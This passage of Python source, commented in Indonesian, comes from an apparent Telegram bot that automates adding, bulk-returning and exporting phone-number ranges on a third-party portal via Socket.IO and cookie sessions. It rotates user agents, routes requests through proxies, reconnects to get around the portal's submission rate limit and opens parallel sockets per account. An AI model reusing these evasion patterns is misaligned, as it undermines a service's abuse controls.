        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
    })
    
    try:
        print("[DEBUG] Mengakses halaman profile...")
        response = session.get(PROFILE_URL, timeout=20)
        
        print(f"[DEBUG] Status code: {response.status_code}, URL: {response.url}")
        
        
        if response.status_code == 302 or (response.status_code == 200 and "login" in response.url.lower()):
            return None, None, None, 'invalid'
        
        
        if response.status_code in [500, 502, 503, 504]:
            print(f"[DEBUG] Server error {response.status_code} - coba ambil CSRF dari response")
            
            
            csrf = extract_csrf_from_page(response.text)
            
            
            if not csrf:
                try:
                    alt_response = session.get(NUMBERS_PAGE_URL, timeout=15)
                    if alt_response.status_code == 200:
                        csrf = extract_csrf_from_page(alt_response.text)
                        print(f"[DEBUG] CSRF dari halaman numbers: {csrf}")
                except:
                    pass
            
            
            return session, csrf, None, 'server_error'
        
        
        if response.status_code == 403:
            return session, None, None, 'forbidden'
        
        
        if response.status_code == 200 and "portal" not in response.url:
            return None, None, None, 'invalid'
        
        
        csrf = extract_csrf_from_page(response.text)
        print(f"[DEBUG] CSRF ditemukan: {csrf}")
        
        profile = extract_profile_from_html(response.text)
        print(f"[DEBUG] Profile extracted: {profile}")
        
        return session, csrf, profile, 'ok'
            
    except requests.exceptions.Timeout:
        return None, None, None, 'timeout'
    except Exception as e:
        print(f"Error login: {e}")
        return None, None, None, 'exception'



def logout_user(user_id):
    """Hapus session user dari database - HANYA jika diminta user (Multi-Account)"""
    try:
        cur.execute("SELECT email FROM user_sessions WHERE user_id = ? AND is_active = 1", (user_id,))
        row = cur.fetchone()
        if not row:
            cur.execute("SELECT email FROM user_sessions WHERE user_id = ? LIMIT 1", (user_id,))
            row = cur.fetchone()
            
        email = row[0] if row else None
        if not email:
            return False, None
            
        print(f"[LOGOUT] User {user_id} ({email}) melakukan logout manual")
        
        cur.execute("DELETE FROM user_sessions WHERE user_id = ? AND email = ?", (user_id, email))
        
        # Hapus socket pool untuk email ini
        try:
            if email in socket_pool.sockets:
                for bot in socket_pool.sockets[email]:
                    try:
                        bot.disconnect()
                    except:
                        pass
                del socket_pool.sockets[email]
                if email in socket_pool.socket_index:
                    del socket_pool.socket_index[email]
                if email in socket_pool.last_used:
                    del socket_pool.last_used[email]
        except Exception as se:
            print(f"[LOGOUT] Socket cleanup failed: {se}")
            
        # Cari satu akun lain untuk diaktifkan
        cur.execute("SELECT email FROM user_sessions WHERE user_id = ? ORDER BY last_used DESC LIMIT 1", (user_id,))
        next_row = cur.fetchone()
        remaining_email = None
        if next_row:
            remaining_email = next_row[0]
            cur.execute("UPDATE user_sessions SET is_active = 1 WHERE user_id = ? AND email = ?", (user_id, remaining_email))
            
        conn.commit()
        return True, remaining_email
    except Exception as e:
        print(f"Error logout: {e}")
        return False, None
    
def get_logout_keyboard(user_id):
    """Keyboard untuk konfirmasi logout"""
    keyboard = [
        [
            InlineKeyboardButton(" YA, LOGOUT", callback_data=f"logout_confirm_{user_id}", style="danger"),
            InlineKeyboardButton("KEMBALI KE MENU", callback_data=f"menu_start_{user_id}", icon_custom_emoji_id="5449847653586188540", style="success")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)



def websocket_add_number(email, range_name, user_id=None):
    """Add nomor via WebSocket - SATU FUNGSI UNTUK SEMUA (add_command & live_add)"""
    try:
        auto_bulk_done = False
        
        # We will retry the entire socket transaction up to 3 times if it fails
        for attempt in range(1, 4):
            print(f"[WS-ADD] Attempt {attempt}/3 untuk {email} (range: {range_name})")
            bot = socket_pool.get_socket(email)
            if not isinstance(bot, SmartIVASBot):
                bot.__class__ = SmartIVASBot
            
            # Connect retry
            ws_ready = False
            for ws_attempt in range(3):
                if not bot.connected:
                    if not bot.connect():
                        print(f"[WS-RETRY] Connect gagal attempt {ws_attempt+1}/3 untuk {email}")
                        if ws_attempt < 2:
                            time.sleep(1 + ws_attempt)
                            bot = SmartIVASBot(email=email, system='ivas')
                            continue
                        break
                
                if not bot.authenticate():
                    print(f"[WS-RETRY] Auth gagal attempt {ws_attempt+1}/3 untuk {email}")
                    if ws_attempt < 2:
                        time.sleep(1 + ws_attempt)
                        try: bot.disconnect()
                        except: pass
                        bot = SmartIVASBot(email=email, system='ivas')
                        continue
                    break
                
                ws_ready = True
                break
            
            if not ws_ready:
                print(f"[WS-ADD] Socket not ready on attempt {attempt}/3. Retrying...")
                if attempt < 3:
                    time.sleep(1.5)
                    continue
                return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'websocket', 'error': 'Gagal connect/auth setelah 3x retry'}
            
            bot.select_menu('add_numbers')
            time.sleep(0.1)
            
            bot.success_count = 0
            bot.failed_count = 0
            bot.response_event.clear()
            bot.submit_form(range_name)
            
            got_response = False
            response_content = None
            
            # Wait for response up to 2 attempts inside this submit
            for wait_attempt in range(2):
                got_response = bot.response_event.wait(timeout=3)
                if got_response and bot.last_response:
                    response_content = bot.last_response
                    print(f"[DEBUG] websocket_add_number response attempt {wait_attempt+1}: {response_content[:100]}")
                    break
                if bot.success_count > 0:
                    print(f"[DEBUG] websocket_add_number success_count={bot.success_count} - dianggap sukses")
                    got_response = True
                    response_content = "success (by counter)"
                    break
                if wait_attempt < 1:
                    print(f"[DEBUG] websocket_add_number wait_attempt {wait_attempt+1} timeout, retrying wait...")
                    time.sleep(0.3)
            
            if not got_response or not response_content:
                print(f"[DEBUG] WebSocket timeout on attempt {attempt}/3. Retrying transaction...")
                if attempt < 3:
                    # disconnect and reconnect next time
                    try: bot.disconnect()
                    except: pass
                    time.sleep(1.5)
                    continue
                break # fall through to HTTP fallback / error
            
            resp = response_content.lower() if isinstance(response_content, str) else str(response_content).lower()
            
            # Check success keywords
            if any(k in resp for k in SUCCESS_KEYWORDS) or bot.success_count > 0:
                print(f"[DEBUG] websocket_add_number SUCCESS detected on attempt {attempt}/3")
                return {'success': 1, 'failed': 0, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket'}
            
            # Check if account full -> auto bulk
            if any(k in resp for k in MAX_NUMBERS_KEYWORDS) and user_id:
                print(f"[AUTO] Akun penuh, auto bulk untuk {email}")
                _, _, _, _, cookies_dict, csrf, _ = get_user_session(user_id)
                if cookies_dict and csrf:
                    session = requests.Session()
                    session.cookies.update(cookies_dict)
                    
                    headers = {
                        'X-CSRF-TOKEN': csrf,
                        'X-Requested-With': 'XMLHttpRequest',
                        'Content-Length': '0'
                    }
                    try:
                        bulk_resp = session.post(BULK_RETURN_URL, headers=headers, timeout=10)
                        if bulk_resp.status_code == 200:
                            auto_bulk_done = True
                            socket_pool.reset_account_status(email)
                            print(f"[AUTO] Bulk return berhasil untuk {email}")
                            
                            if bot.connected:
                                bot.disconnect()
                            time.sleep(1.5)
                            
                            # Reconnect and resubmit
                            if bot.connect() and bot.authenticate():
                                bot.select_menu('add_numbers')
                                time.sleep(0.5)
                                
                                bot.response_event.clear()
                                bot.success_count = 0
                                bot.submit_form(range_name)
                                
                                got_response2 = False
                                for wait_attempt2 in range(2):
                                    got_response2 = bot.response_event.wait(timeout=6)
                                    if got_response2 and bot.last_response:
                                        break
                                    if bot.success_count > 0:
                                        got_response2 = True
                                        bot.last_response = "success"
                                        break
                                    time.sleep(1)
                                
                                if got_response2 and bot.last_response:
                                    resp2 = bot.last_response.lower()
                                    if any(k in resp2 for k in SUCCESS_KEYWORDS) or bot.success_count > 0:
                                        return {'success': 1, 'failed': 0, 'auto_bulk_done': True, 'method': 'websocket'}
                                
                                try:
                                    search_results = search_numbers(session, csrf, range_name, 1)
                                    if search_results and search_results.get('data'):
                                        for item in search_results['data']:
                                            if range_name.lower() in item.get('range', '').lower():
                                                return {'success': 1, 'failed': 0, 'auto_bulk_done': True, 'method': 'websocket'}
                                except:
                                    pass
                        else:
                            print(f"[AUTO] Bulk return gagal: {bulk_resp.status_code}")
                    except Exception as e:
                        print(f"[AUTO] Error bulk return: {e}")
                
                # If bulk fails or adding after bulk fails, it is an error.
                return {'success': 0, 'failed': 1, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket', 'error': 'Account full, bulk failed'}
            
            # If not success and not full, retry the next transaction attempt
            print(f"[WS-ADD] Failed with response: {resp[:100]} on attempt {attempt}/3. Retrying...")
            if attempt < 3:
                try: bot.disconnect()
                except: pass
                time.sleep(1.5)
                continue
        
        # If all 3 socket transaction attempts failed, fallback to HTTP verification!
        print(f"[DEBUG] All 3 websocket attempts failed. Fallback ke HTTP verification...")
        _, _, _, _, cookies_dict, csrf, logged_in = get_user_session(user_id) if user_id else (None, None, None, None, None, None, False)
        if logged_in and cookies_dict and csrf:
            session = requests.Session()
            for key, value in cookies_dict.items():
                session.cookies.set(key, value)
            try:
                search_results = search_numbers(session, csrf, range_name, 1)
                if search_results and search_results.get('data'):
                    for item in search_results['data']:
                        if range_name.lower() in item.get('range', '').lower():
                            print(f"[DEBUG] HTTP verification: range {range_name} ditemukan di sistem")
                            return {'success': 1, 'failed': 0, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket_verified'}
            except Exception as e:
                print(f"[DEBUG] HTTP verification error: {e}")
        
        return {'success': 0, 'failed': 1, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket', 'error': 'Gagal setelah 3x retry transaksi WebSocket'}
        
    except Exception as e:
        print(f"Error in websocket_add_number: {e}")
        import traceback
        traceback.print_exc()
        return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'websocket', 'error': str(e)}

def bulk_return_numbers(session, csrf):
    """Hapus semua nomor"""
    apply_proxy_to_session(session)
    try:
        headers = {
            'X-CSRF-TOKEN': csrf,
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '0'
        }
        
        response = session.post(BULK_RETURN_URL, headers=headers, timeout=30)
        
        if response.status_code == 200:
            try:
                result = response.json()
                return True, result.get('message', 'Semua nomor berhasil dihapus')
            except:
                return True, "Semua nomor berhasil dihapus"
        elif response.status_code == 419:
            return False, "CSRF token mismatch (419) - Silakan coba lagi"
        else:
            return False, f"Gagal: HTTP {response.status_code}"
            
    except Exception as e:
        return False, str(e)
    
def export_numbers(session, csrf, format_type):
    """Export nomor ke file - OPTIMIZED: skip openpyxl, pakai zipfile+xml langsung"""
    apply_proxy_to_session(session)
    try:
        headers = {
            'X-CSRF-TOKEN': csrf,
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        response = session.get(EXPORT_URL, headers=headers, timeout=30, stream=True)
        
        if response.status_code != 200:
            return False, None, f"Gagal download: HTTP {response.status_code}"
        
        content_type = response.headers.get('content-type', '')
        if 'application/json' in content_type:
            try:
                error_data = response.json()
                error_msg = error_data.get('message', 'Tidak ada nomor')
                return False, None, f" {error_msg}"
            except:
                pass
        
        # Stream download ke memory dulu
        content = response.content
        
        if len(content) < 100:  
            return False, None, "📭 Tidak ada nomor untuk diexport"
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if format_type == 'txt':
            # FAST PATH: parse XLSX langsung dari memory pakai zipfile + xml
            # Ini 5-10x lebih cepat dari openpyxl karena skip schema/style parsing
            txt_filename = f"export_{timestamp}.txt"
            
            try:
                import zipfile
                import xml.etree.ElementTree as ET
                from io import BytesIO
                
                lines = []
                xlsx_buffer = BytesIO(content)
                
                with zipfile.ZipFile(xlsx_buffer, 'r') as zf:
                    # Baca shared strings (nomor bisa disimpan di sini)
                    shared_strings = []
                    if 'xl/sharedStrings.xml' in zf.namelist():
                        with zf.open('xl/sharedStrings.xml') as ss_file:
                            ss_tree = ET.parse(ss_file)
                            ss_root = ss_tree.getroot()
                            ns = {'s': 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'}
                            for si in ss_root.findall('.//s:si', ns):
                                t_elem = si.find('.//s:t', ns)
                                shared_strings.append(t_elem.text if t_elem is not None and t_elem.text else '')
                    
                    # Baca sheet1.xml
                    sheet_name = 'xl/worksheets/sheet1.xml'
                    if sheet_name not in zf.namelist():
                        # Coba nama lain
                        for name in zf.namelist():
                            if 'worksheets/sheet' in name:
                                sheet_name = name
                                break
                    
                    with zf.open(sheet_name) as sheet_file:
                        ns = {'s': 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'}
                        row_count = 0
                        
                        # Iterasi event-based untuk hemat memory
                        for event, elem in ET.iterparse(sheet_file):
                            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                            
                            if tag == 'row':
                                row_count += 1
                                if row_count <= 1:
                                    elem.clear()
                                    continue  # Skip header
                                
                                # Cari cell kolom B (index 1)
                                cells = list(elem)
                                for cell in cells:
                                    cell_tag = cell.tag.split('}')[-1] if '}' in cell.tag else cell.tag
                                    if cell_tag != 'c':
                                        continue
                                    
                                    ref = cell.get('r', '')
                                    if not ref.startswith('B'):
                                        continue
                                    
                                    # Ambil value
                                    cell_type = cell.get('t', '')
                                    v_elem = cell.find('{http://schemas.openxmlformats.org/spreadsheetml/2006/main}v')
                                    if v_elem is None:
                                        v_elem = cell.find('v')
                                    
                                    if v_elem is not None and v_elem.text:
                                        if cell_type == 's' and shared_strings:
                                            # Shared string reference
                                            try:
                                                idx = int(v_elem.text)
                                                number = shared_strings[idx]
                                            except (ValueError, IndexError):
                                                number = v_elem.text
                                        else:
                                            number = v_elem.text
                                        
                                        clean_number = re.sub(r'\D', '', str(number).strip())
                                        if clean_number and len(clean_number) > 5:
                                            lines.append(clean_number)
                                    break  # Sudah ketemu kolom B, lanjut row
                                
                                elem.clear()
                
                if not lines:
                    return False, None, "📭 Tidak ada nomor valid ditemukan"
                
                with open(txt_filename, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(lines))
                
                return True, txt_filename, f" {len(lines)} nomor ditemukan"
                
            except Exception as e:
                # Fallback ke openpyxl kalau XML parsing gagal
                print(f"[EXPORT] Fast XML parse failed ({e}), fallback to openpyxl...")
                try:
                    import openpyxl
                    from io import BytesIO
                    
                    wb = openpyxl.load_workbook(BytesIO(content), read_only=True, data_only=True)
                    sheet = wb.active
                    
                    lines = []
                    for row in sheet.iter_rows(min_row=2, values_only=True):
                        if row and len(row) > 1 and row[1]:
                            number = str(row[1]).strip()
                            clean_number = re.sub(r'\D', '', number)
                            if clean_number and len(clean_number) > 5:
                                lines.append(clean_number)
                    
                    wb.close()
                    
                    if not lines:
                        return False, None, "📭 Tidak ada nomor valid ditemukan"
                    
                    with open(txt_filename, 'w', encoding='utf-8') as f:
                        f.write('\n'.join(lines))
                    
                    return True, txt_filename, f" {len(lines)} nomor ditemukan"
                    
                except Exception as e2:
                    return False, None, f" Gagal konversi: {str(e2)}"
        
        # XLSX format - simpan file langsung
        filename = f"export_{timestamp}.xlsx"
        with open(filename, 'wb') as f:
            f.write(content)
        
        return True, filename, " File Excel siap"
        
    except Exception as e:
        return False, None, f" Error: {str(e)}"
    
def excel_to_txt(excel_path, txt_path):
    """Konversi Excel ke TXT"""
    try:
        import openpyxl
        wb = openpyxl.load_workbook(excel_path, read_only=True, data_only=True)
        sheet = wb.active
        
        lines = []
        for row in sheet.iter_rows(min_row=2, values_only=True):
            if row and len(row) > 1 and row[1]:
                number = str(row[1]).strip()
                clean_number = re.sub(r'\D', '', number)
                if clean_number and len(clean_number) > 5:
                    lines.append(clean_number)
        
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines))
        
        wb.close()
        return True
    except Exception as e:
        print(f"Error excel_to_txt: {e}")
        return False

class SimpleCache:
    def __init__(self, ttl_seconds=300):  
        self.cache = {}
        self.ttl = ttl_seconds
    
    def get(self, key):
        if key in self.cache:
            data, timestamp = self.cache[key]
            if datetime.now() - timestamp < timedelta(seconds=self.ttl):
                return data
            else:
                del self.cache[key]
        return None
    
    def set(self, key, value):
        self.cache[key] = (value, datetime.now())
    
    def clear(self):
        self.cache.clear()


platform_cache = SimpleCache(ttl_seconds=300)  

class RequestQueue:
    """Queue manager dengan worker terbatas per user"""
    
    def __init__(self, max_workers=5, max_queue_size=10):
        self.queues = defaultdict(asyncio.Queue)
        self.processing = set()
        self.max_workers = max_workers
        self.max_queue_size = max_queue_size
        self.executor = ThreadPoolExecutor(max_workers=max_workers * 2)
        self._loop = None
        
    @property
    def loop(self):
        if self._loop is None:
            try:
                self._loop = asyncio.get_running_loop()
            except RuntimeError:
                self._loop = asyncio.new_event_loop()
                asyncio.set_event_loop(self._loop)
        return self._loop
    
    async def add_request(self, user_id: int, func, *args, **kwargs):
        """Tambah request ke queue - dengan limit per user"""
        
        if self.queues[user_id].qsize() >= self.max_queue_size:
            raise Exception(f"Queue penuh! Maksimal {self.max_queue_size} request")
        
        future = self.loop.create_future()
        await self.queues[user_id].put((func, args, kwargs, future))
        
        if user_id not in self.processing:
            self.processing.add(user_id)
            asyncio.create_task(self._process_queue(user_id))
        
        return await future
    
    async def _process_queue(self, user_id: int):
        """Proses queue dengan worker terbatas"""
        try:
            while not self.queues[user_id].empty():
                func, args, kwargs, future = await self.queues[user_id].get()
                
                try:
                    
                    result = await asyncio.wait_for(
                        self.loop.run_in_executor(self.executor, func, *args, **kwargs),
                        timeout=30
                    )
                    future.set_result(result)
                except asyncio.TimeoutError:
                    future.set_exception(Exception("Request timeout"))
                except Exception as e:
                    future.set_exception(e)
                
                
                await asyncio.sleep(0.2)
                
        finally:
            self.processing.discard(user_id)
            if not self.queues[user_id].empty():
                self.processing.add(user_id)
                asyncio.create_task(self._process_queue(user_id))
    
    def get_queue_size(self, user_id: int) -> int:
        """Dapatkan ukuran queue"""
        return self.queues[user_id].qsize()
request_queue = None  

class IVASChatBot:
    def __init__(self, email, system='ivas'):
        self.email = email
        self.system = system
        self.sio = socketio.Client(ssl_verify=False, reconnection=True, reconnection_attempts=0)
        self.last_response = None
        self.last_error = None
        self.response_event = threading.Event()
        self.menu_event = threading.Event()
        self.success_count = 0
        self.failed_count = 0
        self.connected = False
        self.rate_limit_until = None
        self.account_full = False
        self.setup_handlers()

    def setup_handlers(self):
        @self.sio.event
        def connect():
            self.connected = True

        @self.sio.event
        def disconnect():
            self.connected = False

        @self.sio.on('bot_message')
        def on_bot_message(data):
            msg_type = data.get('type', 'unknown')
            content = data.get('content', '') or ''
            
            if msg_type == 'menu':
                self.menu_event.set()
                return
            
            if msg_type != 'text':
                return

            content_lower = content.lower()
            self.last_response = content
            self.last_error = None

            if 'maximum number of add numbers submissions' in content_lower:
                self.rate_limit_until = datetime.now() + timedelta(seconds=65)

            if any(k in content_lower for k in MAX_NUMBERS_KEYWORDS):
                self.account_full = True

            is_success = any(k in content_lower for k in SUCCESS_KEYWORDS)
            
            if is_success:
                self.success_count += 1
            else:
                self.failed_count += 1
                self.last_error = content

            self.response_event.set()

        @self.sio.on('admin_message')
        def on_admin_message(data):
            content = data.get('content', '') or ''
            content_lower = content.lower()
            self.last_response = content

            if 'maximum number of add numbers submissions' in content_lower:
                self.rate_limit_until = datetime.now() + timedelta(seconds=65)

            if any(k in content_lower for k in MAX_NUMBERS_KEYWORDS):
                self.account_full = True

            if any(k in content_lower for k in SUCCESS_KEYWORDS):
                self.success_count += 1
            else:
                self.failed_count += 1

            self.response_event.set()

    def connect(self):
        try:
        
            if self.connected:
                try:
                    self.sio.disconnect()
                except:
                    pass
                self.connected = False
                time.sleep(0.3)
        
        
            max_attempts = 5
            for attempt in range(max_attempts):
                try:
                    print(f"[DEBUG] Connect attempt {attempt+1}/{max_attempts} for {self.email}")
                
                    
                    self.sio.connect(
                        CHAT_SERVER, 
                        transports=['websocket'], 
                        wait_timeout=12,  
                        wait=True, 
                        socketio_path='/socket.io',
                        headers={
                            'User-Agent': get_random_user_agent()
                        }
                    )
                
                    
                    wait_start = time.time()
                    timeout = 8  
                    
                    while time.time() - wait_start < timeout:
                        if self.connected:
                            print(f"[DEBUG] Connect SUCCESS for {self.email} after {time.time()-wait_start:.2f}s")
                            return True
                        time.sleep(0.15)
                    
                    
                    print(f"[DEBUG] Connect attempt {attempt+1} - connection not confirmed after {timeout}s")
                    
                    
                    if hasattr(self.sio, 'connected') and self.sio.connected:
                        self.connected = True
                        print(f"[DEBUG] Connect SUCCESS (via sio.connected) for {self.email}")
                        return True
                        
                except Exception as e:
                    print(f"[DEBUG] Connect attempt {attempt+1} failed: {e}")
                    if attempt < max_attempts - 1:
                        # Exponential backoff: 1s, 2s, 3s, 4s
                        backoff = min(1 + attempt, 4)
                        print(f"[DEBUG] Retrying in {backoff}s...")
                        time.sleep(backoff)  
                    continue
            
            
            print(f"[DEBUG] Connect FAILED for {self.email} after {max_attempts} attempts")
            return False
        
        except Exception as e:
            print(f"Error in connect: {e}")
            return False

    def authenticate(self):
        try:
            chat_type = 'internal'
            user_room = f"user:{self.email}:{self.system}:{chat_type}"
            self.sio.emit('join_user_room', {'room': user_room})
            time.sleep(0.12)
            self.sio.emit('message', {'content': '__REQUEST_MENU__', 'email': self.email, 'system': self.system, 'type': chat_type})
            # tunggu menu_event lebih responsif daripada sleep tetap
            self.menu_event.clear() if hasattr(self, 'menu_event') else None
            time.sleep(0.25)
            return True
        except:
            return False

    def select_menu(self, option_id):
        try:
            self.sio.emit('menu_selection', {'selection': option_id, 'email': self.email, 'system': self.system, 'type': 'internal'})
            time.sleep(0.1)
        except:
            pass

    def submit_form(self, termination_string):
        try:
        
            self.response_event.clear()
        
            
            self.success_count = 0
            self.failed_count = 0
            self.last_response = None
            self.last_error = None
        
        
            submit_time = time.time()
        
        
            self.sio.emit('form_submission', {
                'formType': 'add_numbers',
                'formData': {'termination_string': termination_string},
                'email': self.email,
                'system': self.system,
                'type': 'internal'
            })
            
            # delay awal dikurangi untuk respon cepat
            time.sleep(0.15)
            
            wait_start = time.time()
            max_wait = 5  
            
            while time.time() - wait_start < max_wait:
                
                if self.response_event.is_set():
                    break
                
                
                
                if self.success_count > 0:
                    print(f"[DEBUG] submit_form: success_count={self.success_count} detected without response_event")
                    self.last_response = f"Success: {self.success_count} number(s) added"
                    self.response_event.set()
                    break
                
                
                if self.rate_limit_until and datetime.now() < self.rate_limit_until:
                    print(f"[DEBUG] submit_form: rate limit active until {self.rate_limit_until}")
                    self.last_response = "Rate limit active, please wait"
                    self.response_event.set()
                    break
                
                
                if self.account_full:
                    print(f"[DEBUG] submit_form: account full detected")
                    self.last_response = "Maximum number of numbers on the system"
                    self.response_event.set()
                    break
                
                # polling lebih cepat
                time.sleep(0.08)
            
            
            elapsed = time.time() - submit_time
            if self.response_event.is_set():
                print(f"[DEBUG] submit_form completed in {elapsed:.2f}s for {termination_string}")
            else:
                print(f"[DEBUG] submit_form TIMEOUT after {elapsed:.2f}s for {termination_string}")
                
                self.response_event.set()
                self.last_response = "Timeout waiting for server response"
            
        except Exception as e:
            print(f"Error in submit_form: {e}")
            self.last_error = str(e)
            self.last_response = f"Error: {str(e)}"
            self.response_event.set()

    def disconnect(self):
        try:
            if self.connected:
                self.sio.disconnect()
        except:
            pass

class SmartIVASBot(IVASChatBot):
    def __init__(self, email, system='ivas'):
        super().__init__(email, system)
        self.refresh_count = 0
        self.max_refresh = 5
        self.last_refresh = 0
        self.is_refreshing = False

    def handle_rate_limit(self):
        if self.is_refreshing or self.refresh_count >= self.max_refresh:
            return False

        self.is_refreshing = True
        try:
            if self.connected:
                self.disconnect()
                time.sleep(0.8)

            if not self.connect():
                self.is_refreshing = False
                return False

            time.sleep(0.3)
            if not self.authenticate():
                self.is_refreshing = False
                return False

            time.sleep(0.2)
            self.select_menu('add_numbers')
            time.sleep(0.2)

            self.refresh_count += 1
            self.last_refresh = time.time()
            self.is_refreshing = False
            return True
        except:
            self.is_refreshing = False
            return False

    def reset_account_status(self):
        self.account_full = False
        self.rate_limit_until = None
        self.refresh_count = 0



class SocketPool:
    def __init__(self, max_sockets=200):
        self.sockets = {}
        self.last_used = {}
        self.socket_index = {}
        self.socket_lock = threading.Lock()
        self.max_sockets = max_sockets
        self.max_per_email = 5
        self.cleanup_thread = threading.Thread(target=self._auto_cleanup, daemon=True)
        self.cleanup_thread.start()

    def get_or_create(self, email):
        with self.socket_lock:
            if email not in self.sockets:
                self.sockets[email] = []
                self.socket_index[email] = 0
                self.last_used[email] = time.time()

            available = []
            for i, bot in enumerate(self.sockets[email]):
                if bot.connected and not self._is_busy(bot):
                    available.append((i, bot))

            if available:
                idx = self.socket_index[email] % len(available)
                _, bot = available[idx]
                self.socket_index[email] += 1
                self.last_used[email] = time.time()
                return bot

            total_sockets = sum(len(v) for v in self.sockets.values())

            if len(self.sockets[email]) < self.max_per_email and total_sockets < self.max_sockets:
                bot = SmartIVASBot(email=email, system='ivas')
                if bot.connect() and bot.authenticate():
                    bot.select_menu('add_numbers')
                    self.sockets[email].append(bot)
                    self.last_used[email] = time.time()
                    return bot

            if self.sockets[email]:
                return min(self.sockets[email], key=lambda b: getattr(b, 'last_used', 0))

            return None

    def get_socket(self, email):
        return self.get_or_create(email)

    def _is_busy(self, bot):
        return hasattr(bot, 'response_event') and not bot.response_event.is_set()

    def _auto_cleanup(self):
        while True:
            time.sleep(30)
            with self.socket_lock:
                for email, bot_list in list(self.sockets.items()):
                    active_bots = [bot for bot in bot_list if bot.connected]
                    for bot in bot_list:
                        if not bot.connected:
                            try:
                                bot.disconnect()
                            except:
                                pass
                    if active_bots:
                        self.sockets[email] = active_bots
                    else:
                        del self.sockets[email]
                        if email in self.socket_index:
                            del self.socket_index[email]
                        if email in self.last_used:
                            del self.last_used[email]

    def reset_account_status(self, email):
        with self.socket_lock:
            if email in self.sockets:
                for bot in self.sockets[email]:
                    if hasattr(bot, 'reset_account_status'):
                        bot.reset_account_status()


socket_pool = SocketPool(max_sockets=200)



def process_chat_add_single(email, target, user_id=None):
    """Single submit via WebSocket - 1x submit dengan auto bulk jika penuh"""
    try:
        auto_bulk_done = False
        
        # We will retry the entire socket transaction up to 3 times if it fails
        for attempt in range(1, 4):
            print(f"[WS-ADD-CHAT] Attempt {attempt}/3 untuk {email} (target: {target})")
            bot = socket_pool.get_socket(email)
            if not isinstance(bot, SmartIVASBot):
                bot.__class__ = SmartIVASBot
            
            # Connect retry
            ws_ready = False
            for ws_attempt in range(3):
                if not bot.connected:
                    if not bot.connect():
                        print(f"[WS-RETRY-CHAT] Connect gagal attempt {ws_attempt+1}/3 untuk {email}")
                        if ws_attempt < 2:
                            time.sleep(1 + ws_attempt)
                            bot = SmartIVASBot(email=email, system='ivas')
                            continue
                        break
                
                if not bot.authenticate():
                    print(f"[WS-RETRY-CHAT] Auth gagal attempt {ws_attempt+1}/3 untuk {email}")
                    if ws_attempt < 2:
                        time.sleep(1 + ws_attempt)
                        try: bot.disconnect()
                        except: pass
                        bot = SmartIVASBot(email=email, system='ivas')
                        continue
                    break
                
                ws_ready = True
                break
            
            if not ws_ready:
                print(f"[WS-ADD-CHAT] Socket not ready on attempt {attempt}/3. Retrying...")
                if attempt < 3:
                    time.sleep(1.5)
                    continue
                return {'success': 0, 'failed': 1, 'auto_bulk_done': False, 'method': 'websocket', 'error': 'Gagal connect/auth setelah 3x retry'}
            
            bot.select_menu('add_numbers')
            time.sleep(0.1)
            
            bot.success_count = 0
            bot.failed_count = 0
            bot.response_event.clear()
            bot.submit_form(target)
            
            got_response = False
            response_content = None
            
            # Wait for response up to 2 attempts inside this submit
            for wait_attempt in range(2):
                got_response = bot.response_event.wait(timeout=3)
                if got_response and bot.last_response:
                    response_content = bot.last_response
                    print(f"[DEBUG] process_chat_add_single response attempt {wait_attempt+1}: {response_content[:100]}")
                    break
                if bot.success_count > 0:
                    print(f"[DEBUG] process_chat_add_single success_count={bot.success_count} - dianggap sukses")
                    got_response = True
                    response_content = "success (by counter)"
                    break
                if wait_attempt < 1:
                    print(f"[DEBUG] process_chat_add_single wait_attempt {wait_attempt+1} timeout, retrying wait...")
                    time.sleep(0.3)
            
            if not got_response or not response_content:
                print(f"[DEBUG] WebSocket timeout on attempt {attempt}/3. Retrying transaction...")
                if attempt < 3:
                    # disconnect and reconnect next time
                    try: bot.disconnect()
                    except: pass
                    time.sleep(1.5)
                    continue
                break # fall through to HTTP fallback / error
            
            resp = response_content.lower() if isinstance(response_content, str) else str(response_content).lower()
            
            # Check success keywords
            if any(k in resp for k in SUCCESS_KEYWORDS) or bot.success_count > 0:
                print(f"[DEBUG] process_chat_add_single SUCCESS detected on attempt {attempt}/3")
                return {'success': 1, 'failed': 0, 'auto_bulk_done': auto_bulk_done, 'method': 'websocket'}
            
            # Check if account full -> auto bulk
            if any(k in resp for k in MAX_NUMBERS_KEYWORDS) and user_id:
                print(f"[AUTO] Akun penuh, auto bulk untuk {email}")
                _, _, _, _, cookies_dict, csrf, _ = get_user_session(user_id)
                if cookies_dict and csrf:
                    session = requests.Session()
                    session.cookies.update(cookies_dict)
                    
                    headers = {
                        'X-CSRF-TOKEN': csrf,
                        'X-Requested-With': 'XMLHttpRequest',
                        'Content-Length': '0'
                    }
                    try:
                        bulk_resp = session.post(BULK_RETURN_URL, headers=headers, timeout=10)
                        if bulk_resp.status_code == 200:
                            auto_bulk_done = True
                            socket_pool.reset_account_status(email)
                            print(f"[AUTO] Bulk return berhasil untuk {email}")
                            
                            if bot.connected:
                                bot.disconnect()
                            time.sleep(1.5)
                            
                            # Reconnect and resubmit
                            if bot.connect() and bot.authenticate():
                                bot.select_menu('add_numbers')
                                time.sleep(0.5)
                                
                                bot.response_event.clear()
                                bot.success_count = 0
                                bot.submit_form(target)
                                
                                got_response2 = False
                                for wait_attempt2 in range(2):
                                    got_response2 = bot.response_event.wait(timeout=6)
                                    if got_response2 and bot.last_response:
                                        break
                                    if bot.success_count > 0:
                                        got_response2 = True
